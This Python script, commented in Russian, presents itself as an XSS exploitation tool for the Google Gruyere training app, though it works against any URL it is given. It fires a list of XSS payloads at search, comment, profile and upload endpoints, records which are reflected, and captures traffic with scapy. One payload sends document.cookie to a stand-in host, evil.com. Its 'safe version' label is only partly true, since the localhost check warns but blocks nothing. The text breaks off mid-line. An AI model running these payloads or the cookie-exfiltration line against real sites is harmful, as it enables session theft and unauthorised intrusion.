#!/usr/bin/env python3
"""
Скрипт для эксплуатации XSS уязвимостей на Google Gruyere.
Безопасная версия с валидацией и логированием.
"""
import requests
import time
from scapy.all import sniff, wrpcap, IP, TCP
import threading
import sys
import logging
from urllib.parse import urlparse, quote
from typing import List, Dict, Optional
from datetime import datetime

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('xss_exploit.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class XSSCapture:
    """Класс для захвата трафика во время XSS атаки"""
    
    def __init__(self):
        self.packets: List = []
        self.capturing = False
        self.thread: Optional[threading.Thread] = None
        
    def start(self, output_file: str = "xss_attack.pcap", port: int = 8080):
        """Запускает захват трафика в отдельном потоке"""
        self.capturing = True
        self.packets = []
        
        def capture_traffic():
            logger.info(f"Начало захвата трафика в файл: {output_file}")
            
            def packet_handler(packet):
                if self.capturing and IP in packet and TCP in packet:
                    self.packets.append(packet)
                    if len(self.packets) % 10 == 0:
                        logger.debug(f"Захвачено пакетов: {len(self.packets)}")
            
            # Захватываем трафик на указанном порту
            sniff(
                filter=f"tcp port {port}",
                prn=packet_handler,
                store=False,
                timeout=30
            )
            
            # Сохраняем захваченный трафик
            if self.packets:
                wrpcap(output_file, self.packets)
                logger.info(f"Захвачено {len(self.packets)} пакетов, сохранено в {output_file}")
            
            self.capturing = False
        
        # Запускаем захват в отдельном потоке
        self.thread = threading.Thread(target=capture_traffic)
        self.thread.daemon = True
        self.thread.start()
        
        # Даем время на запуск сниффера
        time.sleep(2)
    
    def stop(self):
        """Останавливает захват трафика"""
        self.capturing = False
        if self.thread:
            self.thread.join(timeout=5)

class XSSValidator:
    """Класс для валидации и безопасности"""
    
    @staticmethod
    def validate_url(url: str) -> bool:
        """Проверяет валидность URL"""
        try:
            parsed = urlparse(url)
            if parsed.scheme not in ['http', 'https']:
                raise ValueError("Неверная схема URL. Допустимы только http/https")
            if not parsed.netloc:
                raise ValueError("Отсутствует домен в URL")
            
            # Запрещаем опасные домены (пример)
            dangerous_domains = ['localhost', '127.0.0.1', '0.0.0.0']
            if any(domain in parsed.netloc for domain in dangerous_domains):
                logger.warning(f"URL содержит локальный адрес: {parsed.netloc}")
            
            return True
        except Exception as e:
            logger.error(f"Ошибка валидации URL: {e}")
            return False
    
    @staticmethod
    def safe_request(url: str, method: str = 'GET', **kwargs) -> Optional[requests.Response]:
        """Безопасное выполнение HTTP запроса"""
        try:
            # Ограничиваем таймаут
            kwargs.setdefault('timeout', 10)
            
            if method.upper() == 'GET':
                return requests.get(url, **kwargs)
            elif method.upper() == 'POST':
                return requests.post(url, **kwargs)
            else:
                raise ValueError(f"Неподдерживаемый метод: {method}")
        except requests.exceptions.Timeout:
            logger.error(f"Таймаут при запросе к {url}")
            return None
        except requests.exceptions.RequestException as e:
            logger.error(f"Ошибка запроса к {url}: {e}")
            return None
        except Exception as e:
            logger.error(f"Неожиданная ошибка: {e}")
            return None

class XSSTester:
    """Класс для тестирования XSS уязвимостей"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.results: List[Dict] = []
        self.validator = XSSValidator()
        
    def test_xss_gruyere(self):
        """Тестирует различные XSS векторы на Google Gruyere"""
        
        logger.info(f"Начало тестирования XSS на {self.base_url}")
        print("=" * 70)
        print("ТЕСТИРОВАНИЕ XSS УЯЗВИМОСТЕЙ НА GOOGLE GRUYERE")
        print("=" * 70)
        print(f"Дата тестирования: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}")
        print(f"Целевой URL: {self.base_url}")
        
        # Список тестовых XSS payload
        xss_payloads = [
            # Базовые XSS
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert(\"XSS\")'>",
            "<svg onload='alert(1)'>",
            "<body onload=alert('XSS')>",
            
            # Более сложные payload
            "<script>document.location='http://evil.com/?c='+document.cookie</script>",
            "<iframe src='javascript:alert(\"XSS\")'>",
            
            # Обход фильтров
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<img src=x onerror=\"alert('XSS')\">",
            "'\"><script>alert('XSS')</script>",
            
            # URL encoded
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "javascript:alert('XSS')",
        ]
        
        # Точки ввода для тестирования
        test_cases = [
            {
                "name": "Поле поиска (GET параметр)",
                "url": f"{self.base_url}/search",
                "method": "GET",
                "params": {"q": ""},
                "field": "q"
            },
            {
                "name": "Комментарии (POST запрос)",
                "url": f"{self.base_url}/new_comment",
                "method": "POST",
                "data": {"comment": ""},
                "field": "comment"
            },
            {
                "name": "Профиль пользователя",
                "url": f"{self.base_url}/edit_profile",
                "method": "POST",
                "data": {"description": ""},
                "field": "description"
            },
            {
                "name": "Страница загрузки",
                "url": f"{self.base_url}/upload",
                "method": "POST",
                "files": {"file": ("test.txt", b"test content")},
                "field": "filename"
            }
        ]
        
        for test_case in test_cases:
            print(f"\n{'='*50}")
            print(f"Тестируем: {test_case['name']}")
            print(f"{'='*50}")
            
            for payload in xss_payloads:
                try:
                    if test_case['method'] == 'GET':
                        # Для GET запросов
                        params = test_case['params'].copy()
                        params[test_case['field']] = payload
                        response = self.validator.safe_request(
                            test_case['url'], 
                            method='GET',
                            params=params
                        )
                    else:
                        # Для POST запросов
                        if 'files' in test_case:
                            # Загрузка файла
                            files = {'file': (f"test_xss{payload[:10]}.txt", b"test content")}
                            response = self.validator.safe_request(
                                test_case['url'],
                                method='POST',
                                files=files
                            )
                        else:
                            data = test_case['data'].copy()
                            data[test_case['field']] = payload
                            response = self.validator.safe_request(
                                test_case['url'],
                                method='POST',
                                data=data
                            )
                    
                    if not response:
                        print(f"  ⚠️ Ошибка запроса для payload: {payload[:50]}...")
                        continue
                    
                    # Анализируем ответ на наличие отраженного XSS
                    if payload.replace(' ', '') in response.text.replace(' ', ''):
                        print(f"  ✅ УЯЗВИМОСТЬ: {payload[:50]}...")
                        print(f"     Payload отражен в ответе!")
                        
                        self.results.append({
                            "test_case": test_case['name'],
                            "payload": payload,
                            "url": response.url,
                            "status_code": response.status_code,
                            "vulnerable": True,
                            "reason": "Payload отражен в ответе"
                        })
                        
                        # Сохраняем пример уязвимого ответа
                        safe_name = test_case['name'].replace(' ', '_').replace('(', '').replace(')', '')
                        with open(f"xss_vulnerable_{safe_name}.txt", "w", encoding='utf-8') as f:
                            f.write(f"URL: {response.url}\n")
                            f.write(f"Payload: {payload}\n")
                            f.write(f"Status: {response.status_code}\n")
                            f.write(f"Дата тестирования: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n")
                            f.write("\nОтвет сервера (первые 2000 символов):\n")
                            f.write(response.text[:2000])
                        
                        logger.warning(f"Обнаружена XSS уязвимость в {test_case['name']}: {payload[:50]}")
                        
                    else:
                        print(f"  ❌ Защищено: {payload[:50]}...")
                        
                        self.results.append({
                            "test_case": test_case['name'],
                            "payload": payload,
                            "url": response.url,
                            "status_code": response.status_code,
                            "vulnerable": False,
                            "reason": "Payload не отражен"
                        })
                    
                except Exception as e:
                    error_msg = str(e)[:50]
                    print(f"  ⚠️ Ошибка: {error_msg}...")
                    self.results.append({
                        "test_case": test_case['name'],
                        "payload": payload,
                        "error": str(e),
                        "vulnerable": False,
                        "reason": f"Ошибка запроса: {e}"
                    })
                    logger.error(f"Ошибка при тестировании {test_case['name']}: {e}")
                
                # Небольшая пауза между запросами
                time.sleep(0.5)
        
        # Сохраняем результаты
        self.save_results()
        return self.results
    
    def save_results(self):
        """Сохраняет результаты тестирования"""
        with open("xss_test_results.txt", "w", encoding='utf-8') as f:
            f.write("РЕЗУЛЬТАТЫ ТЕСТИРОВАНИЯ XSS\n")
            f.write("="*50 + "\n\n")
            f.write(f"Дата тестирования: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n")
            
            vulnerable_count = sum(1 for r in self.results if r.get('vulnerable', False))
            total_tests = len(self.results)
            
            f.write(f"Всего тестов: {total_tests}\n")
            f.write(f"Уязвимости найдены: {vulnerable_count}\n")
            f.write(f"Процент уязвимых: {(vulnerable_count/total_tests*100):.1f}%\n\n")
            
            for result in self.results:
                status = "✅ УЯЗВИМО" if result.get('vulnerable', False) else "❌ ЗАЩИЩЕНО"
                f.write(f"{status} - {result['test_case']}\n")
                f.write(f"  Payload: {result.get('payload', 'N/A')[:100]}\n")
                if 'url' in result:
                    f.write(f"  URL: {result['url']}\n")
                f.write(f"  Причина: {result.get('reason', 'N/A')}\n")
                f.write("-"*40 + "\n")
        
        logger.info(f"Результаты сохран
